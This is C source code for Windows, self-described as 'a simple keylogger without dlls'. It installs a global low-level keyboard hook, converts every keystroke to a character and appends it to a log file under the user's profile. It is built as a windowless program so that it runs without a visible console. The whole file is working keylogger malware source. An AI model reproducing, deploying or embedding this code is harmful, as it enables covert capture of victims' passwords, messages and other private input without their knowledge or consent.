#include<windows.h>  
#include<process.h>  
#include<stdio.h>  
//Implements a simple keylogger without dlls.


  
#define WH_KEYBOARD_LL 13  
#define ULONG_PTR ULONG
#pragma comment(lib,"user32.lib")  
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
  
typedef struct {  
  DWORD     vkCode;  
  DWORD     scanCode;  
  DWORD     flags;  
  DWORD     time;  
  ULONG_PTR dwExtraInfo;  
} KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;  
  
HHOOK MyHook;        
int CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);  
int log(char vkcode);  

int main()  
{  
    
    MyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)&KeyboardProc,GetModuleHandle(NULL),NULL);  
    /*while(true){ 
    Sleep(10000);    
    }*/  
    MSG msg;  
    while (GetMessage (&msg, NULL, 0, 0)!=-1)       
    {  
        TranslateMessage (&msg);  
        DispatchMessage (&msg);  
    };  
  
    UnhookWindowsHookEx (MyHook);  
    return 0;  
}  
   
int CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)  
{  
      
    if (code >= HC_ACTION && wParam==WM_KEYDOWN) 
  {  
        DWORD vk_code = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;  
        printf("lParam = %d code = %d HC_ACTION = %d WM_KEYDOWN=%d wParam = %d vk_code = %d\n",lParam,code,HC_ACTION,WM_KEYDOWN,wParam,vk_code);  
    BYTE ks[256];  
    GetKeyboardState(ks);  
    WORD w;  
    ToAscii(vk_code,0,ks,&w,0);  
    char ch =char(w);   
    log(ch);  
    printf("%d ",vk_code);   
  }  
  return CallNextHookEx(MyHook,code,wParam,lParam);  
}  
  

int log(char vkcode){  
FILE *fl;  
fl=fopen("C:\\Users\\user\\log.txt","a+");  
if(vkcode==13)  
    fwrite("\r\n",1,2,fl);
else  
    fwrite(&vkcode, sizeof(char), 1, fl);
//printf("write ok\n");  
fclose(fl);  
return 0;  
}  